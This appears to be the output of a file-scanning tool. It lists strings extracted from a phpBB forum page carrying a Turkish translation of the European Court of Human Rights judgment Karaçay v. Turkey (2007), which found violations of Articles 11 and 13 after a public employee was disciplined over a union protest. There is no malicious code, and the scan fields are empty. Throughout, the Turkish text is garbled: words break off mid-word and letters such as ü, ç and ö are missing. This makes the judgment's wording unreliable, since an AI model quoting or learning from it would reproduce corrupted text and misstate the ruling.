            "\t\t<td width=\"10%\" nowrap=\"nowrap\">İleti başlığı:&nbsp;</td>",
            "\t\t<td><b>KARA",
            "AY- T",
            "RKİYE DAVASI</b></td>",
            "\t</tr>",
            "\t<tr>",
            "\t\t<td colspan=\"2\"><hr class=\"sep\" />AVRUPA İNSAN HAKLARI MAHKEMESİ<br /><br />KARA",
            "AY- T",
            "RKİYE DAVASI<br /><br />(Başvuru no:6615/03<br /><br />KARAR ",
            "EVİRİSİ<br /><br />STRAZBURG <br /><br />27 Mart 2007<br /><br />İşbu karar AİHS’nin 44",
            "2 maddesinde belirtilen koşullar ",
            "evesinde kesinleşecektir. Şekli bazı d",
            "zeltmelere tabi olabilir.<br /><br />Kara",
            "ay-T",
            "rkiye davasında,<br /><br />Avrupa İnsan Hakları Mahkemesi (İkinci Daire),<br /><br />F.TULKENS, başkan<br /><br />I. CABRAL BARRETO,<br /><br />R.T",
            "RMEN,<br /><br />M. UGREKHELİDZE,<br /><br />V. ZAGREBELSKY,<br /><br />A. MULARONİ,<br /><br />D. POPOVİC, yargı",
            "lar,<br /><br />ve B",
            "m Sekreteri S. DOLLE’nin katılımı ile<br /><br />Avrupa İnsan Hakları Mahkemesi Heyeti olarak toplanmış,<br /><br />6 Mart 2007 tarihinde yapılan ",
            "zel g",
            "şmeler sonucunda, yukarıda son anılan tarihte benimsenmiş olan aşağıdaki karara varmıştır:<br /><br />USULİ İŞLEMLER<br /><br />1. T",
            "rkiye Cumhuriyeti aleyhine a",
            "ılan (6615/03) başvuru no’lu davanın nedeni, bu ",
            "lke vatandaşı olan Erhan Kara",
            "ay’ın (“başvuran”) 13 Ocak 2003 tarihinde Avrupa İnsan Hakları S",
            "zleşmesi’nin (“AİHS”) 34. maddesi uyarınca Avrupa İnsan Hakları Mahkemesi’ne (“AİHM”) yapmış olduğu başvurudur.<br /><br />2. Başvuran, AİHM ",
            "nde Ankara Barosu avukatlarından sayın G. Candoğan tarafından temsil edilmektedir. T",
            "rk H",
            "meti (“H",
            "met”) kendisini temsilen bir g",
            "revli tayin etmemiştir.<br /><br />3. Başvuran, AİHS’nin 6, 11, 13 ve 14. maddelerinin ihlal edildiğini iddia etmektedir.<br /><br />4. AİHM, 15 Aralık 2005 tarihinde başvuruyu H",
            "met’e tebliğ etmeye karar vermiştir. AİHM, AİHS’nin 29 ",
            " 3. maddesi uyarınca başvurunun kabul edilebilirliği ile esasının birlikte incelenmesi y",
            "nde karar vermiştir.<br /><br />OLAYLAR<br /><br />I. DAVA KOŞULLARI<br /><br />5. Elektrik m",
            "hendisi olan başvuran 1957 doğumlu olup İstanbul’da ikamet etmektedir.<br /><br />6. Olayların meydana geldiği d",
            "nemde başvuran, kamu g",
            "revlilerinin ",
            "tlendiği sendika birliği olan Kamu Emek",
            "ileri Sendikaları Konfederasyonu’na (KESK) bağlı Yapı-Yol-Sen Sendikası ",
            "yesidir.<br /><br />7. İstanbul Valiliği 5 Eyl",
            "l 2002 tarihinde, memur maaşlarını protesto etmek ve kamuoyu oluşturmak maksadıyla KESK’in iş yavaşlatma ve bırakma şeklinde eylem yapacağı y",
            "nde yetkili makamları bilgilendirmiştir. İstanbul Valiliği, ilgili kurumlardan bu eylemlere katılacak olan kurum personeli hakkında ",
            "nleyici t",
            "m tedbirleri almalarını talep etmiştir. İstanbul Valiliği’nin bu yazısı aynı zamanda Bayındırlık ve İskan Bakanlığı’na da g",
            "nderilmiştir.<br /><br />8. Bayındırlık ve İskan Bakanlığı’na g",
            "re başvuran, KESK tarafından memur maaşlarını protesto etmek amacıyla 5 Eyl",
            "l 2002 tarihinde İstanbul’da yapılan eyleme iştirak etmiştir.<br /><br />9. 15 Ekim 2002 tarihinde başvurana, memur maaşlarını protesto etmek amacıyla KESK tarafından d",
            "zenlenen eyleme katıldığı gerek",
            "esiyle aleyhinde disiplin soruşturması başlatıldığı hususunda bilgi verilmiştir. Başvurandan yazılı savunmasını sunması talep edilmiştir.<br /><br />10. Başvuran, 21 Ekim 2002 tarihinde yazılı savunmasını sunmuştur. Başvuran, İstanbul’da sel baskınlarının meydana gelmesi nedeniyle meslektaşları ile birlikte serviste g",
            "revlendirildiğini belirterek, 5 Eyl",
            "l 2002 tarihinde d",
            "zenlenen eyleme katıldığını reddetmiştir.<br /><br />11. 24 Aralık 2002 tarihinde 657 sayılı Kanun’nun 124/A bendi uyarınca başvuran, “uyarma” cezası ile cezalandırılmıştır. Bayındırlık ve İskan Bakanlığı, polis tarafından d",
            "zenlenen tutanaklardan, yazılı ve g",
            "rsel basından kendisinin KESK tarafından d",
            "zenlenen eyleme katıldığının tespit edildiğini belirtmiştir.<br /><br />12. Başvuran 2 Ocak 2003 tarihinde Bayındırlık ve İskan Bakanlığı’na başvurarak verilen uyarı cezasına itiraz etmiştir. Başvuran, s",
            "zkonusu eyleme katılmadığı ve eylemin yapıldığı g",
            "n İstanbul’da meydana gelen sel baskınları nedeniyle meslektaşları ile birlikte serviste g",
            "revli olduğunu belirtmiştir. Başvuran, bu cezanın uluslararası anlaşmalara ve sendika hakkını g",
            "vence altına alan ulusal d",
            "zenlemelere aykırı olduğunu iddia etmiştir. Başvuran, KESK’e bağlı Yapı-Yol-Sen Sendikası ",
            "yesi olarak faaliyetlerde bulunması sebebiyle kendisine baskı yapıldığını ileri s",
            "r.<br /><br />13. 16 Ocak 2003 tarihinde, 657 sayılı Kanun’un 136. maddesi uyarınca başvuranın itirazı reddedilmiştir.<br /><br />II. İLGİLİ İ",
            " HUKUK VE ULUSLARARASI BELGELER<br /><br />1.T",
            "rk Hukuku<br /><br />1. Anayasa<br /><br />14. 129. maddesinde:<br /><br />“(…)<br /><br />Uyarma ve kınama cezalarıyla ilgili olanlar hari",
            ", disiplin kararları yargı denetimi dışında bırakılamaz.”<br /><br />2. Devlet Memurlarına ilişkin 657 sayılı Yasa<br /><br />15. 125/A bendinde:<br /><br />“Uyarma: Memura, g",
            "revinde ve davranışlarında daha dikkatli olması gerektiğinin yazı ile bildirilmesidir.”<br /><br />16. 136. maddesinde:<br /><br />“(…) itiraz ",
            "zerine verilen kararlar kesin olup, bu kararlar aleyhinde idari yargı yoluna başvurulamaz.”<br /><br />B. 1961 tarihli Avrupa Sosyal Şartı <br /><br />17. Sosyal Şart’ın “",
            "tlenme hakkı” olarak adlandırılan 5. maddesi şu şekildedir:<br /><br />“Akit Taraflar, ",
            "alışanların ve ",
            "alıştıranların ekonomik ve sosyal ",
            "ıkarlarını korumak i",
            "in yerel, ulusal ve uluslararası ",
            "tler kurma ve bu ",
            "tlere ",
            "ye olma ",
            " sağlamak veya geliştirmek amacıyla ulusal mevzuatın bu ",
            " zedelemesini veya zedeleyici bi",
            "imde uygulanmasını ",
            "nlemeyi taahh",
            "t ederler. Bu maddede ",
            "len g",
            "vencelerin, g",
            "venlik g",
            "leri i",
            "in hangi ",
            "de uygulanacağı ulusal yasalarla veya d",
            "zenlemelerle belirtilir. Bu g",
            "vencelerin silahlı kuvvetler mensuplarına uygulanmasına ilişkin ilke ile bu kesime hangi d",
            "zeyde uygulanacağı yine ulusal yasalar veya d",
            "zenlemelerle saptanır.” <br /><br />HUKUK A",
            "ISINDAN<br /><br />I. AİHS’NİN 11 VE 14. MADDELERİNİN İHLAL EDİLDİĞİ İDDİASI HAKKINDA<br /><br />18. Başvuran, bir eyleme katıldığı gerek",
            "esiyle kendisine uyarma cezası verilmesinin dernek kurma ve toplantı ",
            " hakkını ihlal ettiğinden şikayet",
            "i olmaktadır. Başvuran bu itibarla AİHS’nin 11 ve 14. maddelerine atıfta bulunmaktadır. AİHM bu şikayetleri 11. madde bakımından incelemeye karar vermiştir.<br /><br />“1. Herkes asayişi bozmayan toplantılar yapmak, dernek kurmak, ayrıca ",
            "ıkarlarını korumak i",
            "in başkalarıyla birlikte sendikalar kurmak ve sendikalara katılmak haklarına sahiptir.<br /><br />2. Bu hakların kullanılması, demokratik bir toplumda zorunlu tedbirler niteliğinde olarak, ulusal g",
            "venliğin, kamu emniyetinin korunması, kamu d",
            "zeninin sağlanması ve su",
            " işlenmesinin ",
            "nlenmesi, sağlığın veya ahlakın veya başkalarınım hak ve ",
            "klerinin korunması ama",
            "larıyla ve ancak yasayla sınırlanabilir. Bu madde, bu hakların kullanılmasında silahlı kuvvetler, kolluk mensupları veya devletin idare mekanizmasında g",
            "revli olanlar hakkında meşru sınırlamalar konmasına engel değildir.”<br /><br />19. H",
            "met bu iddiaya karşı ",
            "ıkmaktadır.<br /><br />A. Kabuledilebilirlik Hakkında<br /><br />1. ratione materia bakımından yetkisizlik<br /><br />20. H",
            "met, devlet memurları stat",
            "n 657 sayılı Devlet Memurları Kanunu ile d",
            "zenlendiğini ve devlet memurlarının ",
            "zel sekt",
            "rde ",
            "alışan kişilerden farklı ",
            "dev ve sorumluluklarının bulunduğunu belirtmektedir. Kamu hizmetini d",
            "zenleyen kurallar kamu hukukuna dayanmakta ve d",
            "zenin korunması hususunda İdare’nin takdir yetkisi bulunmaktadır. H",
            "met, AİHS’nin ya da Protokollerinin bir devlet memurunun atanması ya da g",
            "rev yeri ile ilgili itirazlarını g",
            "vence altına almadığını hatırlatmaktadır.<br /><br />21. Başvuran, bu iddiaya karşı ",
            "ıkmaktadır.<br /><br />22. AİHM, 11. maddenin 1. paragrafının herkesin sendikaya ",
            "ye olma ve ",
            "ıkarlarını koruma hakkını g",
            "vence altına almaktadır. Devlet memurları doğrudan bu haktan mahrum bırakılmamaktadır. Bununla birlikte, ordu, emniyet ve diğerleri gibi bazı sekt",
            "rlerde g",
            "rev yapan devlet memurlarının sendikal faaliyetlerine sınırlamalar getirilmesi m",
            "r fakat bu t",
            "rden sınırlandırmaların resmi g",
            "revlerinin ifa edilmesinde gerekli olması gerekmektedir (Bkz., Council of Civil Servise Unions ve diğerleri-Birleşik Krallık, no: 11603/85, Komisyon’un 20 Ocak 1987 tarihli kararı, Kararlar ve Raporlar (KR) 50, s. 228). Başvuran, bu t",
            "rden sınırlamalara tabi tutulmasını gerektirecek bir g",
            "revde bulunmamakta, Bayındırlık ve İskan Bakanlığı’nda elektrik",
            "i olarak ",
            "alışmaktadır.<br /><br />23. Sonu",
            " olarak AİHM, H",
            "met’in itirazının reddedilmesine karar vermiştir.<br /><br />2. İ",
            " hukuk yollarının t",
            "ketilmemesi<br /><br />24. H",
            "met, başvuranın İdare’nin keyfi eylemlerine karşı İdare Mahkemelerine başvurma imkanına sahip olduğunu belirtmektedir.<br /><br />25. Başvuran, 657 sayılı Kanuna dayanarak bu sava itiraz etmektedir.<br /><br />26. AİHM, Anayasa’nın 129 ve 657 sayılı Kanun’un 136. maddelerinden, bir uyarma veya ihtar cezasının hukuki kontrole tabi olamayacağı sonucunun ortaya ",
            "ıktığını tespit etmektedir. Başvuran, davaya ilişkin olaylar ışığında mevcut olan i",
            " hukuk yollarını t",
            "ketmiştir. Bundan dolayı AİHM H",
            "met’in itirazını reddetmektedir.<br /><br />27. AİHM, şikayetin AİHS’nin 35",
            "3 maddesi uyarınca a",
            "a dayanaktan yoksun olduğunu tespit etmektedir. Ayrıca AİHM, şikayetin başka hi",
            "bir kabul edilemezlik gerek",
            "esi ile ters d",
            "şmediğini tespit etmektedir. Dolayısıyla şikayeti kabul edilebilir ilan etmek yerinde olacaktır.<br /><br />B. Esasa Dair<br /><br />1.M",
            "dahalenin varolması hakkında<br /><br />28. Başvuran, ulusal bir eyleme katıldığı gerek",
            "esiyle kendisine uyarıda bulunulmasının dernek kurma ",
            " hakkına m",
            "dahale olarak değerlendirildiğini iddia etmektedir. H",
            "met bu y",
            "nde bir g",
            "ş bildirmemiştir. Başvuran gibi AİHM de, dava konusu tedbirin dernek kurma ",
            " hakkını ihlal ettiğine kanaat getirmektedir.<br /><br />2. M",
            "dahalenin dayanağı hakkında<br /><br />29. Benzeri bir m",
            "dahale, m",
            "dahaleyi “kanunun ",
            "”, 2. paragraf uyarınca meşru ama",
            " yada ama",
            "lara y",
            "nelik olduğu ve bu ama",
            "lara ulaşılması i",
            "in “demokratik toplumda gerekli olduğu” durumlar dışında, 11. maddeyi ihlal etmektedir.<br /><br />a) “Kanun tarafından ",
            "len”<br /><br />30. AİHM, başvurana verilen uyarma cezasının, 657 sayılı Kanunun 125 A maddesine uygun olduğuna itiraz edilmediğini tespit etmektedir. Ayrıca AİHM, dava konusu disiplin tedbirinin yasal dayanağının bulunduğunu not etmektedir.<br /><br />b) Meşru ama",
            "<br /><br />31. H",
            "met, m",
            "dahalenin d",
            "zenin korunması amacını g",
            " savunmaktadır. Başvuran g",
            "ş bildirmemektedir.<br /><br />32. AİHM, mevcut davadaki m",
            "dahalenin AİHS’nin 11",
            "2 maddesi uyarınca meşru ama",
            "nden ş",
            "phe duymamaktadır. Bununla birlikte AİHM, benzeri bir m",
            "dahalenin gerekliliği a",
            "ısından vardığı sonucu g",
            "nde bulundurarak, sorunu ",
            "zmeye ",
            "alışmanın gerekli olmadığına kanaat getirmektedir (aşağıda yer alan 34-38 paragrafları).<br /><br />c) “Demokratik toplumda gerekli olması”<br /><br />33. Başvuran, KESK’e bağlı bir sendikaya ",
            "ye olmasaydı kendisine benzeri bir disiplin cezasının verilmeyeceğini savunmaktadır. Başvuran, 5 Eyl",
            "l 2002 tarihli Valiliğin g",
            "nderdiği yazıya atıfta bulunarak, yasal olarak tanınan bir sendikanın y",
            " faaliyeti engellemeye ve ",
            "len eylem g",
            "nden ",
            "nce ve sonra tedbir alarak sendikanın etkililiğini azaltmaya y",
            "nelik idari bir uygulamanın bulunduğunu ortaya koymaktadır. Başvuran, Valiliğin ",
            "nce eylemi engellemeye ",
            "alışarak ve daha sonra bu eylem g",
            "ne katılan devlet memurları aleyhinde ceza kararlarının alınması talimatını vererek, idarenin keyfi olarak hareket etmesini eleştirmektedir. İdare, başvurana uyarma cezasını verirken, b",
            "yle bir disiplin cezasının hukuki kontrol",
            "n yapılmadığını bilmekteydi.<br /><br />34. H",
            "met, başvuranın hala s",
            "zkonusu sendikanın ",
            "yesi olduğunu hatırlatmaktadır. H",
            "met’e g",
            "re 11. madde, disiplin tedbirine konu teşkil eden sendika ",
            "yesi devlet memurlarına dokunulmazlık tanımamaktadır. Başvuran, 5 Haziran 2002 tarihinde işine gitmemesi nedeniyle disiplin cezası almıştır. Başvuran izin almadan sendika eylemine katılmıştır. Başvuran, g",
            "revlerini yerine getirmediği gerek",
            "esiyle disiplin cezası almıştır.<br /><br />35. AİHM ",
            "ncelikle, başvuranın ulusal makamlar ",
            "nde bu eyleme katıldığını inkar ettiğini not etmektedir. Başvuran, ulusal d",
            "zeyde sunduğu savunma layıhasında (yukarıda yer alan 12. paragraf), konu teşkil ettiği disiplin tedbirinin, T",
            "rkiye’nin ulusal ve uluslararası taahh",
            "tnameleri tarafından ",
            " şekliyle sendikal haklarını ihlal ettiğini belirttiği a",
            "a ortadadır. Bundan dolayı başvuran, AİHS’nin 11. maddesine dayanarak yaptığı şikayetini ulusal mahkemeler ",
            "nde ileri s",
            "nden dolayı, AİHM, olaylara itiraz etmesine rağmen şikayetin esasını da inceleyecektir.<br /><br />36. Daha sonra AİHM, dava konusu ulusal eylem g",
            "n ulusal d",
            "zeyde ",
            "nceden bildirildiğini ve eylem yapılmasına itiraz edilmediğini tespit etmektedir. Başvuran bu eyleme katılarak toplantı yapma ",
            " kullanmıştır (Ezelin-Fransa, 26 Nisan 1991 tarihli karar, A serisi no: 202, s. 21, ",
            " 41).<br /><br />37. AİHM, toplantı yapma ",
            "nemini g",
            "nde bulundurarak, ",
            "zellikle g",
            "len s",
            "zde meşru ama",
            "la orantılı olup olmadığını tespit etmek amacıyla dava konusu disiplin cezasını dosyanın tamamı ışığında incelemiştir. AİHM, devlet memurlarının maaşlarının artış oranını protesto etmek amacıyla ",
            "yesi olduğu KESK’in d",
            "zenlediği eyleme katılması nedeniyle disiplin cezası adı altında başvurana uyarma cezasının verildiğini not etmektedir (yukarıda yer alan 7 ve 9. paragraflar). Oysa verilen ceza, her ne kadar d",
            "k olsa da, kendisi gibi sendikaya ",
            "ye kişilerin ",
            "ıkarlarını savunmak amacıyla sendika ",
            "yelerinin grev ve eylemlere yasal olarak katılmamasına y",
            "nelik caydırıcı bir niteliğe sahiptir (s",
            "edilen Ezelin, ",
            " 53).<br /><br />38. AİHM, başvurana verilen uyarma cezasının “demokratik toplumda gerekli olmadığı” sonucuna varmaktadır.<br /><br />39. Dolayısıyla AİHS’nin 11. maddesi ihlal edilmiştir.<br /><br />II. AİHS’NİN 6 VE 13. MADDELERİNİN İHLAL EDİLDİĞİ İDDİASI HAKKINDA <br /><br />40. Başvuran, kendisine verilen uyarma cezasına itiraz etmek i",
            "in i",
            " hukuk yolunun bulunmamasından şikayet etmektedir. Başvuran AİHS’nin 6 ve 13. maddelerini ileri s",
            "rmektedir. AİHM, bu şikayeti, aşağıda ilgili b",
            "n yer aldığı AİHS’nin 13. maddesi a",
            "ısından incelemeye karar vermiştir:<br /><br />“(...) S",
            "zleşme’de tanınmış olan hak ve ",
            "kleri ihlal edilen herkes, ihlal fiili resmi g",
            "rev yapan kimseler tarafından bu sıfatlarına dayanılarak yapılmış da olsa, ulusal bir makama etkili bir başvuru yapabilme hakkına sahiptir.”<br /><br />41. H",
            "met, devlet memurlarının diğer b",
            "n vatandaşlar gibi idarenin keyfi uygulamalarına karşı korunduğunu ileri s",
            "rmektedir. H",
            "met, idarenin b",
            "n eylemlerinin hukuki kontrole tabi olduğunu savunmaktadır.<br /><br />A. Kabul edilebilirlik hakkında<br /><br />42. AİHM, şikayetin AİHS’nin 35",
            "3 maddesi uyarınca a",
            "a dayanaktan yoksun olduğunu tespit etmektedir. Ayrıca AİHM, şikayetin başka hi",
            "bir kabul edilemezlik gerek",
            "esi ile ters d",
            "şmediğini tespit etmektedir. Dolayısıyla şikayeti kabul edilebilir ilan etmek yerinde olacaktır.<br /><br />B. Esasa Dair <br /><br />43. AİHM, AİHS’nin 13. maddesinin, i",
            " hukukta hak ve ",
            "klerin S",
            "zleşme’de yer aldıkları şekliyle ileri s",
            "lebilmelerini sağlayan başvuru yolunun mevcut bulunmasını g",
            "vence altına aldığını hatırlatmaktadır. Dolayısıyla bu h",
            "m, S",
            "zleşmeye dayanan “savunulabilir bir şikayet”’in i",
            "eriğini incelemeye ve uygun tazmin yolunu sunmaya yetkili kılan i",
            " hukuk yolunun bulunmasını gerekli kılmaktadır (Kudla-Polonya [B",
            "k Daire], no: 30210/96, ",
            " 157, AİHM 2000-XI).<br /><br />13. maddenin S",
            "zleşmeci Devletlere getirdiği y",
            "n kapsamı, başvuranın şikayetinin niteliğine g",
            "re değişmektedir. Buna karşın 13. maddenin gerekli kıldığı başvuru yolu teoride olduğu kadar uygulamada da “etkili” olmak zorundadır (İlhan-T",
            "rkiye [B",
            "k Daire], no: 22277/93, ",
            "97, AİHM 2000-VII). 13. madde uyarınca bir “başvuru yolunun etkili olması”, kesin olarak davanın başvuran lehinde sonu",
            "lanmasına bağlı değildir. Aynı şekilde bu h",
            "mde bahsedilen “makam” adli bir makam olmak zorunda değildir. Ancak b",
            "yle bir durumda, s",
            "z konusu makamın yetkileri ve sunduğu g",
            "venceler, kendisine yapılan başvurunun etkililiğini değerlendirmek i",
            "in g",
            "nde bulundurulmaktadırlar. Bunun yanısıra aralarından biri tek başına 13. maddenin gerekliliklerine cevap veremese de, i",
            " hukuk tarafından sunulan başvuru yollarının t",
            "z konusu gereklilikleri yerine getirebilir (Silver ve diğerleri-Birleşik Krallık, 25 Mart 1983 tarihli karar, A serisi no: 61, s. 42, ",
            " 113 ve Chahal-Birleşik Krallık, 15 Kasım 1996 tarihli karar, Derleme 1996-V, s. 1869-1870, ",
            " 145).<br /><br />44. Bu davada AİHM, Anayasa’nın 129 ve 657 sayılı Kanun’un 136. maddelerinden, bir uyarma veya ihtar cezasının hukuki kontrole tabi olamayacağı sonucunun ortaya ",
            "ıktığını hatırlatmaktadır (yukarıda yer alan 14 ve 16. paragraflar). B",
            "ylece AİHM, ulusal hukukun, buna benzer bir uyarma cezasına başvuranın itiraz edebilmesi amacıyla ulusal mahkemeye başvuruda bulunma yolunun bulunmasını ",
            "rmediğini tespit etmektedir (mutatis mutandis, G",
            "neri ve diğerleri-T",
            "rkiye, no: 42853/98, 43609/98 ve 44291/98, ",
            " 77 ve 87, 12 Temmuz 2005 ve s",
            " edilen Metin Turan, ",
            " 36-38). Bundan dolayı başvurana yapılan uyarıya benzer disiplin cezasının verildiği durumlarda etkili başvuru yolunun bulunmaması, olası k",
            "ye kullanımları engelleyecek yada sadece benzeri disiplin tedbirlerinin meşruluğunun denetlenmesini sağlayacak her t",
            "venceden başvuranı mahrum bırakmaktadır.<br /><br />45. Sonu",
            " olarak AİHM, i",
            " hukukta benzeri başvuru yolunun bulunmaması nedeniyle AİHS’nin 13. maddesinin ihlal edildiğine kanaat getirmektedir.<br /><br />III. AİHS’NİN 41. MADDESİNİN UYGULANMASI HAKKINDA<br /><br />46. AİHS’nin 41. maddesi uyarınca,<br /><br />“Mahkeme işbu S",
            "zleşme ve protokollarının ihlal edildiğine karar verirse ve ilgili Y",
            "ksek S",
            "zleşmeci Tarafın i",
            " hukuku bu ihlali ancak kısmen telafi edebiliyorsa, Mahkeme, gerektiği takdirde, hakkaniyete uygun bir surette, zarar g",
            "ren tarafın tatminine h",
            "kmeder.”<br /><br />A. Tazminat<br /><br />47. Başvuran, maruz kaldığı manevi zarar adı altında bir Euro’luk sembolik bir ",
            "cret talep etmektedir. Başvuran, uyarma ve ihtar cezasının hukuki kontrolden ge",
            "mesine engel olan 657 sayılı Kanun’un ilgili maddelerinin kaldırılmasını istemektedir.<br /><br />48. H",
            "met bu iddialara itiraz etmektedir.<br /><br />49. AİHM, ihlal tespitinin tek başına manevi zarar i",
            "in yeterli adil tazmin oluşturduğuna kanaat getirmektedir.<br /><br />B. Masraf ve Harcamalar <br /><br />50. Başvuran aynı zamanda rakam belirtmeksizin ve herhangi bir delille taleplerini desteklemeksizin masraf ve harcamalarının yanısıra avukatlık ",
            "cretinin de tazmin edilmesini istemektedir.<br /><br />51. H",
            "met AİHM’den, başvuran taleplerini hi",
            "bir şekilde kanıtlamadığından dolayı, herhangi bir ",
            "demenin yapılmasına h",
            "kmetmemesini istemektedir.<br /><br />52. AİHM’nin yerleşik i",
            "tihadına g",
            "re, bir başvuran ancak ger",
            "ekliği, gerekliliği ve makul oranda oldukları ortaya konulan masraf ve harcamalarının tazminini elde edebilmektedir. Bu davada AİHM, elinde yeterince unsur bulunmamasını ve yukarıda belirtilen kriterleri g",
            "nde bulundurarak, başvuranın talebini reddetmektedir.<br /><br />BU GEREK",
            "ELERE DAYALI OLARAK AİHM, OYBİRLİĞİYLE,<br /><br />1. Başvurunun kabul edilebilir olduğuna;<br /><br />2. AİHS’nin 11. maddesinin ihlal edildiğine;<br /><br />3. AİHS’nin 13. maddesinin ihlal edildiğine;<br /><br />4. İhlal tespitinin manevi zarar i",
            "in tek başına yeterli adil tazmin oluşturduğuna;<br /><br />5. Adil tazmine ilişkin diğer taleplerin reddine;<br /><br />karar vermiştir.<br /><br />İşbu karar Fransızca olarak hazırlanmış ve AİHM İ",
            "n 77 ",
            " 2 ve 3. maddesine uygun olarak 27 Mart 2007 tarihinde yazılı olarak tebliğ edilmiştir.",
            "\t\t</td>",
            "\t</tr>",
            "\t</table>",
            "<hr width=\"85%\" />",
            "<!--",
            "\tWe request you retain the full copyright notice below including the link to www.phpbb.com.",
            "\tThis not only gives respect to the large amount of time given freely by the developers",
            "\tbut also helps build interest, traffic and use of phpBB3. If you (honestly) cannot retain",
            "\tthe full copyright we ask you at least leave in place the \"Powered by phpBB\" line. If you",
            "\trefuse to include even this then support on our forums may be affected.",
            "\tThe phpBB Group : 2006",
            "// -->",
            "<table width=\"85%\" cellspacing=\"3\" cellpadding=\"0\" border=\"0\" align=\"center\">",
            "<tr>",
            "\t<td><span class=\"gensmall\"><strong>1</strong> sayfadan <strong>1</strong>. sayfa</span></td>",
            "\t<td align=\"right\"><span class=\"gensmall\">T",
            "m zamanlar UTC + 2 saat </span></td>",
            "</tr>",
            "<tr>",
            "\t<td colspan=\"2\" align=\"center\"><span class=\"gensmall\">Powered by phpBB &copy; 2000, 2002, 2005, 2007 phpBB Group<br />http://www.phpbb.com/</span></td>",
            "</tr>",
            "</table>",
            "</body>",
            "</html>"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://www.emsalkararlar.com/</a",
            "http://www.phpbb.com/</span",
            "http://www.emsalkararlar.com/",
            "http://www.emsalkararlar.com/viewtopic.php?f=17&ampt=20",
            "http://www.emsalkararlar.com/viewtopic.php?f=17&ampt=20</a"
        ]
    },
    "time": "0:00:00.457678",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
